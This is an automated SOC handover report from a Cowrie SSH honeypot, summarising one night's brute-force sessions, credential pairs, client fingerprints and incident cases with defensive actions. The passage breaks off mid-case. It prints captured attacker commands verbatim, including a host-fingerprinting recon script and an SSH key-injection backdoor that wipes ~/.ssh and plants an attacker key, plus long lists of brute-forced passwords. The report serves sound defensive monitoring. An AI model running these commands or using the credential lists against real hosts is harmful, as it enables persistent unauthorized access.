# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-21 |
| **Generated At** | 2026-08-21T08:45:25Z |
| **Shift Time** | 08:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **215** |
| Confirmed Threats | **194** |
| False Positives Filtered | **21** (9.8%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **29** |
| High Severity Cases | **112** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **103** |
| Malware Samples Analyzed | **3** HIGH · **17** MED · 24 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **133** |
| Unique Credential Pairs | **90** |
| Unique Usernames | **18** |
| Unique Passwords | **86** |
| Successful Auth Pairs | **118** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `ubuntu` | 12 |
| `debian` | 8 |
| `unknown` | 7 |
| `blank` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `user2020` | 5 |
| `password` | 5 |
| `debian2025` | 5 |
| `operator2025` | 4 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `user` | `user2020` | 5 |
| `debian` | `debian2025` | 5 |
| `operator` | `operator2025` | 4 |
| `support` | `support` | 4 |
| `root` | `root2004` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `operator` | `operator2025` | `10.0.0.73` | 2026-08-21T04:55:34 |
| `root` | `12345` | `2.57.122.209` | 2026-08-21T04:55:41 |
| `support` | `support` | `10.0.0.73` | 2026-08-21T04:56:22 |
| `ubuntu` | `Password` | `217.60.255.130` | 2026-08-21T04:57:43 |
| `root` | `sysadmin` | `217.60.255.130` | 2026-08-21T04:57:46 |
| `root` | `1234567` | `2.57.122.209` | 2026-08-21T05:03:40 |
| `ubuntu` | `admin#123` | `217.60.255.130` | 2026-08-21T05:07:30 |
| `root` | `qwe123QWE` | `217.60.255.130` | 2026-08-21T05:07:33 |
| `root` | `root2004` | `218.248.19.102` | 2026-08-21T05:10:59 |
| `operator` | `operator2025` | `189.56.0.19` | 2026-08-21T05:13:13 |
| `operator` | `operator2025` | `103.121.27.218` | 2026-08-21T05:13:22 |
| `operator` | `operator2025` | `201.28.237.90` | 2026-08-21T05:13:30 |
| `root` | `12345678` | `2.57.122.209` | 2026-08-21T05:15:49 |
| `ubuntu` | `Admin@123456789` | `217.60.255.130` | 2026-08-21T05:17:03 |
| `root` | `Mahdi51711!` | `217.60.255.130` | 2026-08-21T05:17:06 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-21T05:17:30 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-21T05:17:31 |
| `root` | `123456789` | `2.57.122.209` | 2026-08-21T05:19:28 |
| `unknown` | `1234567` | `85.105.2.51` | 2026-08-21T05:20:41 |
| `root` | `root2004` | `10.0.0.73` | 2026-08-21T05:22:21 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-21T05:23:17 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-21T05:23:17 |
| `root` | `1234567890` | `2.57.122.209` | 2026-08-21T05:23:35 |
| `ubuntu` | `Web@123456` | `217.60.255.130` | 2026-08-21T05:26:50 |
| `root` | `Xperiasp11!` | `217.60.255.130` | 2026-08-21T05:26:54 |
| `root` | `123qwe` | `2.57.122.209` | 2026-08-21T05:27:39 |
| `blank` | `blank2009` | `10.0.0.73` | 2026-08-21T05:28:03 |
| `root` | `princess` | `217.60.240.161` | 2026-08-21T05:29:31 |
| `root` | `master` | `217.60.240.161` | 2026-08-21T05:29:32 |
| `root` | `hello` | `217.60.240.161` | 2026-08-21T05:29:34 |
| `root` | `charlie` | `217.60.240.161` | 2026-08-21T05:29:35 |
| `root` | `888888` | `217.60.240.161` | 2026-08-21T05:29:37 |
| `root` | `22` | `217.60.240.161` | 2026-08-21T05:29:38 |
| `root` | `696969` | `217.60.240.161` | 2026-08-21T05:29:52 |
| `root` | `qwertyuiop` | `217.60.240.161` | 2026-08-21T05:29:55 |
| `root` | `freedom` | `217.60.240.161` | 2026-08-21T05:30:01 |
| `root` | `aa123456` | `217.60.240.161` | 2026-08-21T05:30:03 |
| `root` | `23` | `217.60.240.161` | 2026-08-21T05:30:07 |
| `root` | `qazwsx` | `217.60.240.161` | 2026-08-21T05:30:09 |
| `root` | `ninja` | `217.60.240.161` | 2026-08-21T05:30:10 |
| `root` | `azerty` | `217.60.240.161` | 2026-08-21T05:30:11 |
| `root` | `123123` | `217.60.240.161` | 2026-08-21T05:30:13 |
| `root` | `solo` | `217.60.240.161` | 2026-08-21T05:30:14 |
| `root` | `loveme` | `217.60.240.161` | 2026-08-21T05:30:15 |
| `root` | `whatever` | `217.60.240.161` | 2026-08-21T05:30:17 |
| `root` | `donald` | `217.60.240.161` | 2026-08-21T05:30:18 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.140.80.162` | 2026-08-21T05:30:19 |
| `*1` | `$4` | `34.140.80.162` | 2026-08-21T05:30:33 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9082` | `34.140.80.162` | 2026-08-21T05:30:35 |
| `root` | `123qwerty` | `2.57.122.209` | 2026-08-21T05:31:29 |
| `user1` | `user1` | `77.90.185.20` | 2026-08-21T05:35:26 |
| `root` | `21` | `2.57.122.209` | 2026-08-21T05:35:33 |
| `ubuntu` | `Admin@2025` | `217.60.255.130` | 2026-08-21T05:36:27 |
| `unknown` | `1234567` | `190.57.233.133` | 2026-08-21T05:36:27 |
| `root` | `Darvag@123` | `217.60.255.130` | 2026-08-21T05:36:30 |
| `unknown` | `1234567` | `27.39.130.144` | 2026-08-21T05:36:38 |
| `support` | `support` | `176.53.159.196` | 2026-08-21T05:37:12 |
| `root` | `root2004` | `112.26.99.93` | 2026-08-21T05:38:53 |
| `root` | `root2004` | `1.233.103.18` | 2026-08-21T05:39:02 |
| `root` | `321` | `2.57.122.209` | 2026-08-21T05:39:43 |
| `root` | `4321` | `2.57.122.209` | 2026-08-21T05:43:14 |
| `user` | `user2020` | `16.171.111.127` | 2026-08-21T05:43:45 |
| `user` | `user2020` | `218.102.209.81` | 2026-08-21T05:43:55 |
| `ubuntu` | `Tech@2022` | `217.60.255.130` | 2026-08-21T05:46:01 |
| `root` | `Vmware@123` | `217.60.255.130` | 2026-08-21T05:46:05 |
| `blank` | `blank2009` | `219.143.40.210` | 2026-08-21T05:46:12 |
| `blank` | `blank2009` | `82.181.235.31` | 2026-08-21T05:46:20 |
| `root` | `54321` | `2.57.122.209` | 2026-08-21T05:47:09 |
| `root` | `654321` | `2.57.122.209` | 2026-08-21T05:50:57 |
| `blank` | `blank2021` | `10.0.0.73` | 2026-08-21T05:52:04 |
| `blank` | `blank2021` | `213.234.9.218` | 2026-08-21T05:53:37 |
| `blank` | `blank2021` | `179.185.1.97` | 2026-08-21T05:53:45 |
| `user` | `user2020` | `10.0.0.73` | 2026-08-21T05:54:59 |
| `root` | `P4ssw0rd` | `2.57.122.209` | 2026-08-21T05:55:00 |
| `ubuntu` | `administrator@123` | `217.60.255.130` | 2026-08-21T05:55:49 |
| `root` | `navid@123` | `217.60.255.130` | 2026-08-21T05:55:54 |
| `root` | `P4ssword` | `2.57.122.209` | 2026-08-21T05:58:30 |
| `nobody` | `nobody2021` | `10.0.0.73` | 2026-08-21T06:01:02 |
| `admin` | `admin` | `104.155.51.175` | 2026-08-21T06:01:34 |
| `root` | `P@ssw0rd` | `2.57.122.209` | 2026-08-21T06:02:31 |
| `ubuntu` | `adm1n@321` | `217.60.255.130` | 2026-08-21T06:05:47 |
| `root` | `Adm!n1234` | `217.60.255.130` | 2026-08-21T06:05:52 |
| `root` | `Passw0rd` | `2.57.122.209` | 2026-08-21T06:08:22 |
| `user` | `user2020` | `209.198.156.49` | 2026-08-21T06:11:46 |
| `root` | `p4ssword` | `2.57.122.209` | 2026-08-21T06:12:02 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-21T06:13:47 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-21T06:15:12 |
| `root` | `p@ssw0rd` | `2.57.122.209` | 2026-08-21T06:15:23 |
| `ubuntu` | `Pass@1234` | `217.60.255.130` | 2026-08-21T06:15:36 |
| `root` | `admin` | `217.60.255.130` | 2026-08-21T06:15:40 |
| `debian` | `debian2001` | `79.127.3.154` | 2026-08-21T06:16:46 |
| `root` | `passw0rd` | `2.57.122.209` | 2026-08-21T06:18:57 |
| `nobody` | `nobody2021` | `118.123.116.93` | 2026-08-21T06:19:14 |
| `nobody` | `nobody2021` | `93.118.164.193` | 2026-08-21T06:19:23 |
| `root` | `password` | `2.57.122.209` | 2026-08-21T06:22:36 |
| `debian` | `debian2025` | `10.0.0.73` | 2026-08-21T06:25:14 |
| `ubuntu` | `1q2w3e!Q@W#E` | `217.60.255.130` | 2026-08-21T06:25:46 |
| `root` | `pass@123` | `217.60.255.130` | 2026-08-21T06:25:49 |
| `root` | `qwerty` | `2.57.122.209` | 2026-08-21T06:26:05 |
| `debian` | `debian2025` | `195.218.159.123` | 2026-08-21T06:26:37 |
| `debian` | `debian2025` | `179.181.133.153` | 2026-08-21T06:26:45 |
| `debian` | `debian2001` | `10.0.0.73` | 2026-08-21T06:27:56 |
| `salman` | `123456` | `112.217.188.122` | 2026-08-21T06:29:07 |
| `345gs5662d34` | `345gs5662d34` | `112.217.188.122` | 2026-08-21T06:29:11 |
| `salman` | `3245gs5662d34` | `112.217.188.122` | 2026-08-21T06:29:13 |
| `unknown` | `password` | `10.0.0.73` | 2026-08-21T06:34:17 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `66.228.53.46` | 2026-08-21T06:34:27 |
| `ubuntu` | `Passw0rd@123` | `217.60.255.130` | 2026-08-21T06:36:02 |
| `root` | `@123` | `217.60.255.130` | 2026-08-21T06:36:05 |
| `debian` | `debian2025` | `218.95.73.31` | 2026-08-21T06:42:20 |
| `debian` | `debian2025` | `14.32.244.233` | 2026-08-21T06:42:30 |
| `debian` | `debian2001` | `182.79.218.101` | 2026-08-21T06:44:41 |
| `ubuntu` | `cisco@123` | `217.60.255.130` | 2026-08-21T06:46:15 |
| `root` | `Complex@123` | `217.60.255.130` | 2026-08-21T06:46:20 |
| `guest` | `guest2001` | `177.159.150.111` | 2026-08-21T06:49:40 |
| `guest` | `guest2001` | `49.124.153.45` | 2026-08-21T06:49:52 |
| `unknown` | `password` | `31.173.8.170` | 2026-08-21T06:52:07 |
| `unknown` | `password` | `125.69.76.148` | 2026-08-21T06:52:15 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **215** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 51 |
| libssh | 36 |
| OpenSSH | 30 |
| Nmap scanner | 7 |
| Paramiko (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 30 | 30 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 23 | 1 |
| `16443846184e...` | Generic scanner | 23 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 30 | 30 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 23 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 23 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 21 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.217.188.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **59** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS8473` | Bahnhof AB | 2 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS9299` | Philippine Long Distance Telephone Company | 2 | LOW |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (112)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e58c0b757fc9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 04:55 |
| **Last Seen** | 2026-08-21 04:55 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 04:55:28` | `cowrie.session.connect` |
| `2026-08-21 04:55:29` | `cowrie.client.version` |
| `2026-08-21 04:55:29` | `cowrie.client.kex` |
| `2026-08-21 04:55:41` | `cowrie.login.success` |
| `2026-08-21 04:55:49` | `cowrie.session.params` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.success` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:49` | `cowrie.command.input` |
| `2026-08-21 04:55:50` | `cowrie.log.closed` |
| `2026-08-21 04:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-671366778640

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 04:57 |
| **Last Seen** | 2026-08-21 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 04:57:41` | `cowrie.session.connect` |
| `2026-08-21 04:57:41` | `cowrie.client.version` |
| `2026-08-21 04:57:41` | `cowrie.client.kex` |
| `2026-08-21 04:57:43` | `cowrie.login.success` |
| `2026-08-21 04:57:43` | `cowrie.direct-tcpip.request` |
| `2026-08-21 04:57:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 04:57:43` | `cowrie.direct-tcpip.data` |
| `2026-08-21 04:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b70e0436931

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 04:57 |
| **Last Seen** | 2026-08-21 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 04:57:45` | `cowrie.session.connect` |
| `2026-08-21 04:57:45` | `cowrie.client.version` |
| `2026-08-21 04:57:45` | `cowrie.client.kex` |
| `2026-08-21 04:57:46` | `cowrie.login.success` |
| `2026-08-21 04:57:46` | `cowrie.direct-tcpip.request` |
| `2026-08-21 04:57:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 04:57:47` | `cowrie.direct-tcpip.data` |
| `2026-08-21 04:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc1aeafaf0b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:03 |
| **Last Seen** | 2026-08-21 05:03 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:03:33` | `cowrie.session.connect` |
| `2026-08-21 05:03:34` | `cowrie.client.version` |
| `2026-08-21 05:03:36` | `cowrie.client.kex` |
| `2026-08-21 05:03:40` | `cowrie.login.success` |
| `2026-08-21 05:03:42` | `cowrie.session.params` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.success` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:42` | `cowrie.command.input` |
| `2026-08-21 05:03:43` | `cowrie.log.closed` |
| `2026-08-21 05:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bf7ac3be48

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:07 |
| **Last Seen** | 2026-08-21 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:07:29` | `cowrie.session.connect` |
| `2026-08-21 05:07:29` | `cowrie.client.version` |
| `2026-08-21 05:07:29` | `cowrie.client.kex` |
| `2026-08-21 05:07:30` | `cowrie.login.success` |
| `2026-08-21 05:07:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:07:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:07:30` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05bb0306534c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:07 |
| **Last Seen** | 2026-08-21 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:07:32` | `cowrie.session.connect` |
| `2026-08-21 05:07:32` | `cowrie.client.version` |
| `2026-08-21 05:07:32` | `cowrie.client.kex` |
| `2026-08-21 05:07:33` | `cowrie.login.success` |
| `2026-08-21 05:07:34` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:07:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:07:34` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415145bc1dce

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-08-21 05:10 |
| **Last Seen** | 2026-08-21 05:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:10:57` | `cowrie.session.connect` |
| `2026-08-21 05:10:57` | `cowrie.client.version` |
| `2026-08-21 05:10:57` | `cowrie.client.kex` |
| `2026-08-21 05:10:59` | `cowrie.login.success` |
| `2026-08-21 05:11:00` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18aac16bdedc

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-08-21 05:13 |
| **Last Seen** | 2026-08-21 05:13 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:13:08` | `cowrie.session.connect` |
| `2026-08-21 05:13:10` | `cowrie.client.version` |
| `2026-08-21 05:13:10` | `cowrie.client.kex` |
| `2026-08-21 05:13:13` | `cowrie.login.success` |
| `2026-08-21 05:13:14` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516c4529f3bc

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-08-21 05:13 |
| **Last Seen** | 2026-08-21 05:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:13:20` | `cowrie.session.connect` |
| `2026-08-21 05:13:20` | `cowrie.client.version` |
| `2026-08-21 05:13:20` | `cowrie.client.kex` |
| `2026-08-21 05:13:22` | `cowrie.login.success` |
| `2026-08-21 05:13:22` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71329ab4a44f

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-08-21 05:13 |
| **Last Seen** | 2026-08-21 05:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
